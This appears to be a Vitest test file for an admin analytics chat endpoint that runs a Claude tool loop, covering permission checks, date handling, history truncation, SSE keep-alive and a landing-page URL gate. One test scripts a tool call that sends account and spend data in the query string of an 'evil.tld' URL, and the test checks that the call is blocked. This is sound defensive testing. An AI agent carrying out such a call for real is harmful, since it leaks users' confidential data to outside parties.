import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import type { BetaToolResultBlockParam, BetaToolUseBlock } from "@anthropic-ai/sdk/resources/beta/messages/messages";
import { parseSSEStream } from "@/lib/chatStreamParser";
import type { SSEEvent } from "@/types/chat";

// POST /api/chat with the session, the admin record, the Meta context, the
// Claude loop and the page fetch mocked: the DB permission re-check, the
// landing-page URL gate, preset → explicit dates, and the SSE keep-alive.

type Admin = { id: string; isSuper: boolean; permissions: Record<string, boolean> };
let session: { adminId: string } | null = null;
let admin: Admin | null = null;
let adminCounter = 0;

const buildAnalystContext = vi.fn();
const runToolLoop = vi.fn();
const fetchLandingPageText = vi.fn();

vi.mock("@/lib/adminSession", () => ({ getAdminSession: () => session }));
vi.mock("@/lib/api/requireAdmin", () => ({ requireAdminRecord: async () => admin }));
vi.mock("@/lib/analyst/context", () => ({ buildAnalystContext: (...a: unknown[]) => buildAnalystContext(...a) }));
vi.mock("@/lib/reportGenerator", () => ({ generateReport: vi.fn() }));
vi.mock("@/lib/meta/client", () => ({ RateLimitError: class extends Error {}, TokenExpiredError: class extends Error {} }));
vi.mock("@/lib/claude/toolLoop", () => ({ runToolLoop: (...a: unknown[]) => runToolLoop(...a) }));
vi.mock("@/lib/analyst/landingPage", async (importOriginal) => {
  const real = await importOriginal<typeof import("@/lib/analyst/landingPage")>();
  return { ...real, fetchLandingPageText: (...a: unknown[]) => fetchLandingPageText(...a) };
});

let POST: (req: Request) => Promise<Response>;

beforeAll(async () => {
  ({ POST } = await import("@/app/api/chat/route"));
});

beforeEach(() => {
  // A fresh admin per test keeps the per-admin rate limit out of the way.
  const id = `admin-${++adminCounter}`;
  session = { adminId: id };
  admin = { id, isSuper: false, permissions: { analyst: true } };
  buildAnalystContext.mockReset().mockResolvedValue({ contextText: "data", scope: "all", knownAccountIds: new Set(["act_1"]) });
  runToolLoop.mockReset().mockResolvedValue({
    stopReason: "end_turn",
    iterations: 1,
    servedBy: "claude-opus-5-5",
    usage: { inputTokens: 0, outputTokens: 0, cacheReadTokens: 0, cacheWriteTokens: 0 },
  });
  fetchLandingPageText.mockReset().mockImplementation(async (url: string) => ({ url, text: "Welcome" }));
});

afterEach(() => vi.useRealTimers());

function chat(body: Record<string, unknown>): Request {
  return new Request("http://localhost/api/chat", { method: "POST", body: JSON.stringify(body), headers: { "content-type": "application/json" } });
}

async function events(res: Response): Promise<SSEEvent[]> {
  const out: SSEEvent[] = [];
  for await (const e of parseSSEStream(res.body!)) out.push(e);
  return out;
}

describe("POST /api/chat — permission re-check", () => {
  it("401 without a session, 403 when the admin is gone or lost the analyst permission", async () => {
    session = null;
    expect((await POST(chat({ messages: [{ role: "user", content: "hi" }] }))).status).toBe(401);
    session = { adminId: "gone" };
    admin = null;
    expect((await POST(chat({ messages: [{ role: "user", content: "hi" }] }))).status).toBe(403);
    session = { adminId: "x" };
    admin = { id: "x", isSuper: false, permissions: { analyst: false, dashboard: true } };
    expect((await POST(chat({ messages: [{ role: "user", content: "hi" }] }))).status).toBe(403);
    expect(runToolLoop).not.toHaveBeenCalled();
  });

  it("lets a super admin through", async () => {
    admin = { id: session!.adminId, isSuper: true, permissions: {} };
    const res = await POST(chat({ messages: [{ role: "user", content: "hi" }] }));
    expect(res.status).toBe(200);
    expect((await events(res)).at(-1)).toMatchObject({ type: "done", stopReason: "end_turn" });
  });
});

describe("POST /api/chat — request handling", () => {
  it("analyzes a preset as explicit business-day dates", async () => {
    const res = await POST(chat({ messages: [{ role: "user", content: "hi" }], dateRange: { preset: "today" } }));
    await events(res);
    const { dateRange } = buildAnalystContext.mock.calls[0][0] as { dateRange: { since: string; until: string } };
    expect(dateRange.since).toMatch(/^\d{4}-\d{2}-\d{2}$/);
    expect(dateRange.until).toBe(dateRange.since);
    const dataBlock = (runToolLoop.mock.calls[0][0] as { system: Array<{ text: string }> }).system[1].text;
    expect(dataBlock).toContain(`Today (${dateRange.since} to ${dateRange.until})`);
  });

  it("cuts an over-long history block instead of rejecting the conversation", async () => {
    const res = await POST(
      chat({
        messages: [
          { role: "user", content: "q1" },
          { role: "assistant", content: [{ type: "tool_use", id: "t1", name: "fetch_landing_page", input: { url: "https://a.com" } }] },
          { role: "user", content: [{ type: "tool_result", tool_use_id: "t1", content: "x".repeat(200_000) }] },
          { role: "assistant", content: "done" },
          { role: "user", content: "q2" },
        ],
      })
    );
    expect(res.status).toBe(200);
    await events(res);
    const sent = (runToolLoop.mock.calls[0][0] as { messages: Array<{ content: unknown }> }).messages;
    expect(JSON.stringify(sent[2].content)).toContain("[truncated]");
  });

  it("only fetches pages on sites the user typed, without query strings it didn't type", async () => {
    const results: BetaToolResultBlockParam[][] = [];
    runToolLoop.mockImplementation(async (opts: { runTools: (c: BetaToolUseBlock[]) => Promise<BetaToolResultBlockParam[]> }) => {
      const call = (id: string, url: string) => ({ type: "tool_use", id, name: "fetch_landing_page", input: { url } }) as BetaToolUseBlock;
      results.push(
        await opts.runTools([
          call("t1", "https://evil.tld/?d=act_1-spend-12345"),
          call("t2", "https://shop.example.com/offer?d=secret"),
        ])
      );
      return { stopReason: "end_turn", iterations: 1, servedBy: "m", usage: { inputTokens: 0, outputTokens: 0, cacheReadTokens: 0, cacheWriteTokens: 0 } };
    });
    const res = await POST(chat({ messages: [{ role: "user", content: "Audit https://shop.example.com/offer please" }] }));
    await events(res);

    const [blocked, allowed] = results[0];
    expect(blocked).toMatchObject({ tool_use_id: "t1", is_error: true });
    expect(String(blocked.content)).toContain("Ask the user to paste");
    expect(allowed.is_error).toBeUndefined();
    expect(fetchLandingPageText).toHaveBeenCalledTimes(1);
    expect(fetchLandingPageText.mock.calls[0][0]).toBe("https://shop.example.com/offer");
  });
});

describe("POST /api/chat — keep-alive", () => {
  it("sends `: ping` comments while a request is in flight, which the SSE parser skips", async () => {
    vi.useFakeTimers({ toFake: ["setInterval", "clearInterval", "setTimeout", "clearTimeout"] });
    let release!: () => void;
    runToolLoop.mockImplementation(async () => {
      await new Promise<void>((r) => (release = r));
      return { stopReason: "end_turn", iterations: 1, servedBy: "m", usage: { inputTokens: 0, outputTokens: 0, cacheReadTokens: 0, cacheWriteTokens: 0 } };
    });
    const res = await POST(chat({ messages: [{ role: "user", content: "hi" }] }));
    const [raw, parsed] = res.body!.tee();
    const text = new Response(raw).text();
    const parsedEvents = events(new Response(parsed));

    await vi.advanceTimersByTimeAsync(31_000);
    release();
    await vi.advanceTimersByTimeAsync(0);

    expect((await text).match(/^: ping$/gm)).toHaveLength(2);
    const types = (await parsedEvents).map((e) => e.type);
    expect(types).toEqual(["status", "done"]);
  });
});
